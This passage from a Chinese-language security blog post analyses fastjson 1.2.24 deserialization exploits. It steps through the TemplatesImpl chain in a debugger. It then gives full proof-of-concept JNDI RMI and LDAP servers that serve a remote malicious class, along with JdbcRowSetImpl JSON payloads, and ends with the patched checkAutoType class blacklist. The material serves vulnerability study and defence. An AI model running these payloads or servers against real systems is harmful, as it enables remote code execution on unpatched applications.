src="/../../pict/image-20240618144254472.png" alt="image-20240618144254472"></p><p>接着来到parseField函数，大概意思是解析字段。</p><p><img src="/../../pict/image-20240618144612263.png" alt="image-20240618144612263"></p><p>JavaBeanDeserializer#parseField调用JavaBeanDeserializer#smartMatch来匹配key对应的字段反序列化器。而key匹配的对象就是之前在JavaBeanInfo#build函数中符合条件的setter和getter函数的字段名。有三个<code>outputProperties</code>，<code>stylesheetDOM</code>，<code>uRIResolver</code>。</p><p><img src="/../../pict/image-20240618145249774.png" alt="image-20240618145249774"></p><p><img src="/../../pict/image-20240618145205864.png" alt="image-20240618145205864"></p><p>接着这里会有一些替换操作，比如我们传入的键名为_bytecodes，会替换掉，变为bytecodes。</p><p><img src="/../../pict/image-20240618150615180.png" alt="image-20240618150615180"></p><p>然后又调用getFieldDeserializer函数获取key对应的字段反序列化器，而我们知道，只有_outputProperties这个参数存在对应的字段反序列化器。所以当key为_bytecodes匹配不到，返回null。<img src="/../../pict/image-20240618150844833.png" alt="image-20240618150844833"></p><p>然后回到JavaBeanDeserializer#parseField，虽然返回null，但是后面会在ConcurrentHashMap中在获取key对应的deserOrField。然后获取其对应的DefaultFieldDeserializer(默认字段反序列化器)</p><p><img src="/../../pict/image-20240618164604868.png" alt="image-20240618164604868"></p><p><img src="/../../pict/image-20240618164153627.png" alt="image-20240618164153627"></p><p>然后调用这个反序列化器的parseField解析字段操作。fieldValueDeserilizer为null，进入getFieldValueDeserilizer给fieldValueDeserilizer赋值</p><p><img src="/../../pict/image-20240618165319976.png" alt="image-20240618165319976"></p><p><img src="/../../pict/image-20240618165516301.png" alt="image-20240618165516301"></p><p>接着会去用fieldValueDeserilizer的deserialze反序列化操作对_bytecodes反序列化，然后在83行setValue中给TemplatesImpl对象赋值。</p><p><img src="/../../pict/image-20240618165615185.png" alt="image-20240618165615185"></p><p>可以看一下调用堆栈。这里进入了decodeBase64函数中，对我们的_bytecodes对应的值进行base64解码，然后就可以获取到我们恶意代码的字节流了，然后会在setValue赋值给TemplatesImpl对象。这也是为什么我们的payload需要base64编码的原因。</p><p><img src="/../../pict/image-20240618165935913.png" alt="image-20240618165935913"></p><p><img src="/../../pict/image-20240618170143828.png" alt="image-20240618170143828"></p><p>后面的几个键对应的值也是用这种方式赋值，只是不需要base64解码了。因为他们需要赋值的对象不是byte[]数组类型。具体可以自己调试，注意在ObjectArrayCodec#deserialze绕一圈进入第二次才会进去解析_bytecodes的部分</p><p><img src="/../../pict/image-20240618172124226.png" alt="image-20240618172124226"></p><p>对于key等于_outputProperties时，我们是可以直接获取它的字段反序列化器的。当它进入SetValue函数的时候，是会通过反射调用getoutputProperties方法。然后就会走到我么TemplatesImpl利用链的链首了。</p><p><img src="/../../pict/image-20240618170526201.png" alt="image-20240618170526201"></p><p><img src="/../../pict/image-20240618170853320.png" alt="image-20240618170853320"></p><h4 id="调用堆栈"><a href="#调用堆栈" class="headerlink" title="调用堆栈"></a>调用堆栈</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">newInstance:<span class="hljs-number">396</span>, Class (java.lang)<br>getTransletInstance:<span class="hljs-number">455</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<br>newTransformer:<span class="hljs-number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<br>getOutputProperties:<span class="hljs-number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>setValue:<span class="hljs-number">85</span>, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)<br>parseField:<span class="hljs-number">83</span>, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)<br>parseField:<span class="hljs-number">773</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)<br>deserialze:<span class="hljs-number">600</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)<br>deserialze:<span class="hljs-number">188</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)<br>deserialze:<span class="hljs-number">184</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)<br>parseObject:<span class="hljs-number">368</span>, DefaultJSONParser (com.alibaba.fastjson.parser)<br>parse:<span class="hljs-number">1327</span>, DefaultJSONParser (com.alibaba.fastjson.parser)<br>deserialze:<span class="hljs-number">45</span>, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)<br>parseObject:<span class="hljs-number">639</span>, DefaultJSONParser (com.alibaba.fastjson.parser)<br>parseObject:<span class="hljs-number">339</span>, JSON (com.alibaba.fastjson)<br>parseObject:<span class="hljs-number">302</span>, JSON (com.alibaba.fastjson)<br>main:<span class="hljs-number">38</span>, TemplatesImpl_POC (org.example.fastjson_1_2_24)<br></code></pre></td></tr></table></figure><h4 id="一些问题总结"><a href="#一些问题总结" class="headerlink" title="一些问题总结"></a>一些问题总结</h4><h5 id="恶意类为什么要继承AbstractTranslet类？"><a href="#恶意类为什么要继承AbstractTranslet类？" class="headerlink" title="恶意类为什么要继承AbstractTranslet类？"></a>恶意类为什么要继承<code>AbstractTranslet</code>类？</h5><p>直接跟，调用堆栈如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">defineTransletClasses:<span class="hljs-number">418</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<br>getTransletInstance:<span class="hljs-number">451</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<br>newTransformer:<span class="hljs-number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<br>main:<span class="hljs-number">32</span>, TemplatesImpl_Test (org.example.fastjson_1_2_24)<br></code></pre></td></tr></table></figure><p><img src="/../../pict/image-20240614050729537.png" alt="image-20240614050729537"></p><p>只有当要加载的类，父类等于<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>时，才能有<code>_transletIndex = i</code>这样才能使得我们的<code>(AbstractTranslet) _class[_transletIndex].newInstance()</code>语句能正常执行。而这条语句，才是正常触发命令的语句，因为加载类之后还需要实例化，这一句刚好是对我们加载的恶意类进行实例化。</p><p><img src="/../../pict/image-20240614050954801.png" alt="image-20240614050954801"></p><h5 id="为什么需要对-bytecodes进行Base64编码"><a href="#为什么需要对-bytecodes进行Base64编码" class="headerlink" title="为什么需要对_bytecodes进行Base64编码"></a>为什么需要对_bytecodes进行Base64编码</h5><p>调试过程中已经说明。对_bytecodes赋值前会进行base64解码。调试堆栈如下</p><p><img src="/../../pict/image-20240618172731962.png" alt="image-20240618172731962"></p><h5 id="为什么需要设置-tfactory为"><a href="#为什么需要设置-tfactory为" class="headerlink" title="为什么需要设置_tfactory为{}"></a>为什么需要设置_tfactory为{}</h5><p>因为在TemplatesImpl#defineTransletClasses中会调用_tfactory的一个方法，如果为_tfactory为null会报错。<img src="/../../pict/image-20240618173038044.png" alt="image-20240618173038044"></p><p>那它的值应该为TransformerFactoryImpl对象，为什么我们传入的是{}</p><p>JavaBeanDeserializer#deserialze中，如果_tfactory值为空，会自动创建对应的实例对象，然后返回创建的这个实例对象。</p><p><img src="/../../pict/image-20240618174048503.png" alt="image-20240618174048503"></p><p><img src="/../../pict/image-20240618173958508.png" alt="image-20240618173958508"></p><h3 id="JdbcRowSetImpl的利用链"><a href="#JdbcRowSetImpl的利用链" class="headerlink" title="JdbcRowSetImpl的利用链"></a>JdbcRowSetImpl的利用链</h3><p>基于JdbcRowSetImpl的利用链主要有两种利用方式，即JNDI+RMI和JNDI+LDAP，都是属于基于Bean Property类型的JNDI的利用方式。</p><h4 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI + RMI"></a>JNDI + RMI</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.JNDIServer;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">//http://127.0.0.1:7777/JNDIEvilCode.class即可</span><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exloit&quot;</span>,<br>                <span class="hljs-string">&quot;JNDIEvilCode&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:7777/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.fastjson_1_2_24;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcRowSetImpl_RMI_POC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        JSON.parse(payload);<br><span class="hljs-comment">//        JSON.parseObject(payload);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.JNDIServer;<br><br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><br><span class="hljs-comment">// jndi 绕过 jdk8u191 之前的攻击  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDILdapServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:7777/#JNDIEvilCode&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1099</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>,<br>                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                    port,<br>                    ServerSocketFactory.getDefault(),<br>                    SocketFactory.getDefault(),<br>                    (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br>        <span class="hljs-keyword">private</span> URL codebase;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * */</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         * * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span> <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.fastjson_1_2_24;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcRowSetImpl_JNDI_POC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br><span class="hljs-comment">//        JSON.parse(payload);</span><br>        JSON.parseObject(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>两种方式大差不差，主要是针对不同版本jdk，因为这是基于JNDI注入的攻击。</p><h4 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h4><p>并不复杂，前面和TemplatesImpl链差不多，只是中间有段临时代码。</p><p>断点直接打到<code>com.sun.rowset.JdbcRowSetImpl</code>的setAutoCommit和setDataSourceName两个函数，我们的payload设置了dataSourceName和autoCommit值，因此会反序列化会调用setAutoCommit和setDataSourceName。</p><p>先进入setAutoCommit，调用了父类的setAutoCommit，参数是我们设置的恶意服务地址。</p><p><img src="/../../pict/image-20240618195133168.png" alt="image-20240618195133168"></p><p>然后dataSoutce设置为恶意服务地址。</p><p><img src="/../../pict/image-20240618195210821.png" alt="image-20240618195210821"></p><p>然后进入到setAutoCommit，调用JdbcRowSetImpl#connect方法</p><p><img src="/../../pict/image-20240618195505330.png" alt="image-20240618195505330"></p><p>然后发现调用了熟悉的lookup，参数是恶意服务地址，接下就是熟悉的JNDI注入了。</p><p><img src="/../../pict/image-20240618195642592.png" alt="image-20240618195642592"></p><h2 id="fastjson修复手段"><a href="#fastjson修复手段" class="headerlink" title="fastjson修复手段"></a>fastjson修复手段</h2><p>我们先看相比于fastjson1.2.24，作出了什么改变。<br>将DefaultJSONParser.parseObject()函数中的<code>TypeUtils.loadClass</code>替换为checkAutoType()函数</p><p><img src="/../../pict/image-20240618203815699.png" alt="image-20240618203815699"></p><p>进入checkAutoType函数，大致就是黑白名单对反序列化的类型过滤，如果开启了autoTypeSupport，就先白名单，再黑名单，否则就先黑名单，再白名单。默认情况下，autoTypeSupport为False，即先进行黑名单过滤，遍历denyList，然后遍历acceptList</p><p><img src="/../../pict/image-20240618204240304.png" alt="image-20240618204240304"></p><p><img src="/../../pict/image-20240618204322790.png" alt="image-20240618204322790"></p><p>白名单(acceptList)默认为空，黑名单(denyList)有如下类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">bsh<br>com.mchange<br>com.sun.<br>java.lang.Thread<br>java.net.Socket<br>java.rmi<br>javax.xml<br>org.apache.bcel<br>org.apache.commons.beanutils<br>org.apache.commons.collections.Transformer<br>org.apache.commons.collections.functors<br>org.apache.commons.collections4.comparators<br>org.apache.commons.fileupload<br>org.apache.myfaces.context.servlet<br>org.apache.tomcat<br>org.apache.wicket.util<br>org.codehaus.groovy.runtime<br>org.hibernate<br>org.jboss<br>org.mozilla.javascript<br>org.python.core<br>org.springframework<br></code></pre></td></tr></table></figure><h3 id="autoTypeSupport"><a href="#autoTypeSupport" class="headerlink" title="autoTypeSupport"></a>autoTypeSupport</h3><p>关于autoTypeSupport的知识，我直接引用<a href="https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/#autoTypeSupport">drunkbaby</a>师傅的。</p><blockquote><p>autoTypeSupport是<code>checkAutoType()</code>函数出现后ParserConfig.java中新增的一个配置选项，在<code>checkAutoType()</code>函数的某些代码逻辑起到开关的作用。</p><p>默认情况下autoTypeSupport为False，将其设置为True有两种方法：</p><ul><li>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></li><li>代码中设置：<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>，如果有使用非全局ParserConfig则用另外调用<code>setAutoTypeSupport(true);</code></li></ul><p>AutoType白名单设置方法：</p><ol><li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li><li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code></li><li>通过fastjson.properties文件配置。在1.2.25&#x2F;1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao</code></li></ol></blockquote><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>下面内容来自<a href="https://github.com/LeadroyaL/fastjson-blacklist">LeadroyaL&#x2F;fastjson-blacklist (github.com)</a>，可以直接github上看。</p><p><code>fastjson</code> 在1.2.42开始，把原本明文的黑名单改成了哈希过的黑名单，防止安全研究者对其进行研究。</p><p><code>fastjson</code> 在1.2.61开始，在<a href="https://github.com/alibaba/fastjson/commit/d1c0dff9a33d49e6e7b98a4063da01bbc9325a38%E4%B8%AD%EF%BC%8C%E6%8A%8A%E9%BB%91%E5%90%8D%E5%8D%95%E4%BB%8E%E5%8D%81%E8%BF%9B%E5%88%B6%E6%95%B0%E5%8F%98%E6%88%90%E4%BA%86%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%95%B0%EF%BC%8C%E5%8F%AF%E8%83%BD%E6%98%AF%E4%B8%BA%E4%BA%86%E9%98%B2%E6%AD%A2%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E8%80%85%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E3%80%82">https://github.com/alibaba/fastjson/commit/d1c0dff9a33d49e6e7b98a4063da01bbc9325a38中，把黑名单从十进制数变成了十六进制数，可能是为了防止安全研究者进行搜索。</a></p><h3 id="目前的列表"><a href="#目前的列表" class="headerlink" 